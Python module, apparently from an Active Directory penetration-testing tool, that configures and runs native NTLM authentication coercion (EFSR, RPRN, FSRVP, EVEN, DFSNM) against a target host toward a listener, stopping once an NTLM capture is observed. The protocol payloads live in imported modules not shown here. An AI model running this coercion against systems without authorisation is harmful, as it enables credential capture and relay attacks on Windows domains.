"""High-level native coercion runner."""

from __future__ import annotations

from dataclasses import dataclass, field

from adscan_internal.rich_output import mark_sensitive, print_info_debug, print_success_debug
from adscan_internal.services.coercion.aiosmb_adapter import AiosmbRpcAdapter
from adscan_internal.services.coercion.core import (
    CaptureSignal,
    CoercionAuthType,
    CoercionEngine,
    CoercionListener,
    CoercionMethod,
    CoercionRunConfig,
    CoercionRunResult,
    CoercionTarget,
    RpcTransport,
    _coercion_method_delay,
)
from adscan_internal.services.coercion.display import print_coercion_summary
from adscan_internal.services.coercion.registry import default_coercion_methods



@dataclass(frozen=True)
class NativeCoercionRunConfig:
    """Runtime configuration for native coercion.

    ``protocols`` defaults to the empty tuple, which means "walk the entire
    ordered catalog" (EFSR, then RPRN, then FSRVP, EVEN, DFSNM - coercer's
    order). This is deliberate: an empty filter is required so the run reaches
    vectors like MS-RPRN that coerce single-homed members but were never
    attempted under the old EFSR-only default. Pass an explicit protocol tuple
    only when the operator narrows the surface with ``--method``.

    ``capture_signal`` is forwarded to the engine as the authoritative stop
    condition (a real inbound NTLM capture observed by the listener). When
    ``None`` the engine walks the whole catalog and stops only on timeout.
    """

    listener_host: str
    listener_auth_type: CoercionAuthType = "smb"
    listener_port: int | None = None
    timeout_seconds: float = 60.0
    delay_seconds: float = field(
        default_factory=lambda: _coercion_method_delay()
    )  # pause between methods on one host; scan pacing ``coercion.methods`` (0.05 s default)
    protocols: tuple[str, ...] = ()
    transports: tuple[RpcTransport, ...] = ("ncan_np",)
    method_names: tuple[str, ...] = ()
    methods: tuple[CoercionMethod, ...] = field(
        default_factory=default_coercion_methods
    )
    capture_signal: CaptureSignal | None = None
    show_summary: bool = True


async def run_native_coercion(
    *,
    connection_factory,
    target_host: str,
    config: NativeCoercionRunConfig,
    target_name: str | None = None,
) -> CoercionRunResult:
    """Run native async coercion against one target using an aiosmb factory."""

    target = CoercionTarget(host=target_host, display_name=target_name)
    listener = CoercionListener(
        auth_type=config.listener_auth_type,
        host=config.listener_host,
        port=config.listener_port,
    )
    print_info_debug(
        "[coercion] starting native coercion "
        f"target={mark_sensitive(target.label, 'hostname')} "
        f"listener={mark_sensitive(listener.host, 'hostname')} "
        f"auth_type={mark_sensitive(listener.auth_type, 'text')} "
        f"protocols={mark_sensitive(','.join(config.protocols) or 'all', 'text')}"
    )

    engine = CoercionEngine(
        target=target,
        rpc_adapter=AiosmbRpcAdapter(connection_factory=connection_factory),
        config=CoercionRunConfig(
            listeners=(listener,),
            methods=config.methods,
            timeout_seconds=config.timeout_seconds,
            delay_seconds=config.delay_seconds,
            protocols=config.protocols,
            transports=config.transports,
            method_names=config.method_names,
            auth_types=(config.listener_auth_type,),
            capture_signal=config.capture_signal,
        ),
    )
    result = await engine.run()
    print_success_debug(
        f"[coercion] completed target={mark_sensitive(target.label, 'hostname')} "
        f"captured={result.captured} attempts={result.attempts} "
        f"timed_out={result.timed_out}"
    )
    if config.show_summary:
        print_coercion_summary(result)
    return result
